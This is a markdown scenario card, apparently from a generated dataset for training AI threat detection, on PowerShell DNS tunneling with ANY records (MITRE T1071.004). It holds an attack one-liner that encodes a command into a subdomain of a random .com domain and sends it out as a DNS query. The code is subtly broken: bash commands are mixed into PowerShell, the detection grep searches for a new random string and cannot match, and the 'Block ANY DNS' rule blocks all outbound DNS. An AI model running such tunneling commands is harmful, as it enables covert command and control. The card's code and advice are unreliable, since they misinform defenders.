---
type: campaign
scenario_id: 396
tactic: Command and Control
technique: "T1071.004: Application Layer Protocol: DNS"
technique_id: T1071.004
tags: [campaign, lotl, command_and_control]
---

# Using PowerShell to perform DNS tunneling with ANY records.

## Threat Description
Using PowerShell to perform DNS tunneling with ANY records.

## Attack Command
```
powershell -c "$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; Resolve-DnsName -Type ANY $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo c2cmd | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com) | Out-Null"
```

## Detection Logic
Monitor ANY queries: `tshark -Y 'dns.qry.type == 255' | grep $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)`; PowerShell DNS: `wmic process where name='powershell.exe' get commandline | findstr Resolve-DnsName`.

## Mitigation
Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Block suspicious DNS: `netsh advfirewall firewall add rule name='Block ANY DNS' dir=out action=block protocol=UDP remoteport=53`.

## AI Training Prompt
Train AI to detect PowerShell DNS tunneling with ANY records by analyzing query patterns, base64-encoded subdomains, and ANY record usage; suggest DNS filtering.

## References
- MITRE ATT&CK T1071.004: https://attack.mitre.org/techniques/T1071/004/
- CWE-319: https://cwe.mitre.org/data/definitions/319.html
